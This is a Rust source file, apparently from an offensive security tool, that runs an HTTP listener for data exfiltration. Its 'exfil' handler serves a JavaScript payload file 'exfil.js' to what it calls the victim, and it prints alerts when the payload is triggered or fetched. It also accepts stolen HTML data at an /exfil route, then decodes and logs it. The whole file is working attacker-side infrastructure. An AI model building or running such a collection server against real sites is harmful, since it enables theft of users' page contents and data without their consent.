use hyper::service::{make_service_fn, service_fn};
use hyper::{Body, Method, Request, Response, Server, StatusCode};
use tokio::fs::File;
use tokio_util::codec::{BytesCodec, FramedRead};
use termion::color;

use crate::convert;
use crate::process_payload;

/// This is our service handler. It receives a Request, routes on its
/// path, and returns a Future of a Response.
pub async fn exfil(req: Request<Body>, logfile: String, verbosity: bool ) -> Result<Response<Body>, hyper::Error> {
    match (req.method(), req.uri().path()) {
        // Serve some instructions at /
        (&Method::GET, "/") | (&Method::GET, "/index.html") =>{
            println!("[+] Payload Triggered!");
            Ok(Response::new(Body::from("OK")))
        },

        // Fetch Javascript File
        (&Method::GET, "/exfil.js") => {
            if let Ok(file) = File::open("exfil.js").await {
                println!("{}[!] Payload Fetched By Victim!{}", color::Fg(color::Magenta), color::Fg(color::Reset));
                let stream = FramedRead::new(file, BytesCodec::new());
                let body = Body::wrap_stream(stream);
                return Ok(Response::new(body));
            }
            println!("[!] Could Not Find File!");
            Ok(Response::new(Body::from("NOT FOUND")))
        },

        // Exfil HTML Data
        (&Method::GET, "/exfil") => {
            let whole_body = hyper::body::to_bytes(req.into_body()).await?;
            let payload = convert::bytes_to_string(&whole_body);
            process_payload::decode_payload("HTML", payload, logfile, verbosity);
            Ok(Response::new(Body::from("Ok")))
        },

       
        // Return the 404 Not Found for other routes.
        _ => {
            let mut not_found = Response::default();
            *not_found.status_mut() = StatusCode::NOT_FOUND;
            Ok(not_found)
        }
    }
}

#[tokio::main]
pub async fn start_listener(port: u16, logfile: String, verbosity: bool) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    
    println!("{}[+] Logfile: {}",color::Fg(color::Yellow), logfile);
    println!("{}[+] Verbosity: {}",color::Fg(color::LightRed), verbosity);
    
    let addr = ([0, 0, 0, 0], port).into();

    //let service = make_service_fn(|_| async { Ok::<_, hyper::Error>(service_fn(exfil)) });
    let service = make_service_fn(move |_| {
        let logfile = logfile.clone();
        async move {
            Ok::<_, hyper::Error>(service_fn(move |req| {
                exfil(req, logfile.clone(), verbosity)
            }))
        }
    });

    let server = Server::bind(&addr).serve(service);

    println!("{}[!] Listening on http://{}{}",color::Fg(color::LightBlue), addr,color::Fg(color::Reset));

    server.await?;

    Ok(())
}
